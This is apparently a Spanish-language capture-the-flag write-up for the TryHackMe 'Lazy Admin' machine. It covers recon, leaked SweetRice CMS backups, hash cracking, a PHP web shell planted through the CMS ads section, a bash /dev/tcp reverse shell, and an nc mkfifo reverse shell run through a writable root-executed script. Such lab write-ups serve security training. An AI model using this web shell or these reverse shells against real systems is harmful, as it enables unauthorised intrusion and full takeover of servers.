---
layout: single
title: Lazy Admin - TryHackMe
excerpt: " Easy linux machine to practice your skills_. Have some fun! There might be multiple ways to get user access. "
date: 2022-08-28
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-lazyadmin/lazyadmin.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - sweetrice
  - john
  - fuzzing
  - mysql
  - php
---

Easy linux machine to practice your skills_. Have some fun! There might be multiple ways to get user access.

# Summary
- IP: 10.10.43.118
- Ports: 22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
	-  80 -> Apache httpd 2.4.18

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.116.216 -oN targeted
```

- Analizamos la página web, la cual solo muestra la página por defecto de apache, por lo que no nos sirve de nada.
- Analizamos directorios con gobuster:

```bash
$gobuster dir -u 10.10.43.118 -w /home/dante/SecLists/Discovery/Web-Content/common.txt
```

- Encontramos un directorio "content" el cual nos muestra una página web de un CMS denominado "SweetRice", nada más; hacemos fuzzing con gobuster para encontrar posibles subrutas en content/:

```bash
$gobuster fuzz -u http://10.10.43.118/content/FUZZ -w /home/dante/SecLists/Discovery/Web-Content/common.txt -b 404
```

- Encontramos la ruta "/content/as" la cual tiene la página de login del CMS "SweetRice"; bucamos vulnerabilidades para sweetrice:

```bash
searchsploit sweetrice
```

- Encontramos varias, probamos con la de backups discovery en busqueda de posibles contraseñas, en el archivo del exploit encontramos lo siguiente:

```
You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup
```

- Nos damos cuenta en el fuzzing anteriormente hecho encontramos el directorio "content/inc" entonces accedemos y encontramos la carpeta de backups mysql, descargamos el archivo, lo analizamos y nos encontramos un posible usuario con una contraseña hasheada, la intentamos romper con john:

```bash
$john -w:/home/dante/SecLists/Passwords/Leaked-Databases/rockyou.txt pass.hash --format=RAW-MD5
```

En caso de querer volver a ejecutar john, se debe remover el siguiente archivo:

```bash
$rm /home/dante/.john/john.pot
```

- Encontramos una contraseña, la probamos en la página de login como el usuario "manager" y accedemos a la página de sweetrice.
- Nos damos cuenta que se trata de la versión 1.5.1; en searchsploit vemos que hay un ataque Cross-Site Request Forgery / PHP Code Execution, descargamos el html y lo analizamos:

```
In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
Code You Can
Customize Exploit For Your Self .
```

- Nos dirigimos a la pestaña "ads" y podremos agregar cualquier código php que será luego interpretado, aprovechamos esta vulnerabilidad para crear un parámetro "cmd" el cual nos permita ejecutar comandos ya sea desde el link o desde el propio recurso:

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

- Ahora nos dirigimos al recurso creado con el nombre de "shell" y nos entablamos una reverse shell:

http://10.10.43.118/content/inc/ads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.18.101.123/443 0>%261"

- Accedemos, hacemos tratamiento de la tty y encontramos la primera flag.
- Hacemos sudo -l y nos arroja lo siguiente:

```bash
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

- Tenemos permiso de ejecutar como root el script escrito en perl "backup.pl", lo analizamos para ver en que consiste y nos damos cuenta que dentro del código ejecuta otro archivo:

```bash
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

- Analizamos este otro archivo y vemos que tenemos permisos de escritura, es decir podemos modificarlo y esto se ejecutará como root, por lo que podemos escirbir el código para entablar una reverse shell y esta nos permitirá acceder como root, en este caso el archivo copy.sh ya tiene puesta una reverse shell, le cambiamos la direccion ip por la nuestra y nos ponemos en escucha:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.101.123 1234 >/tmp/f
```

- Y por último ejecutamos como root (sudo) el binario permitido:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

- Encontramos la flag de root.
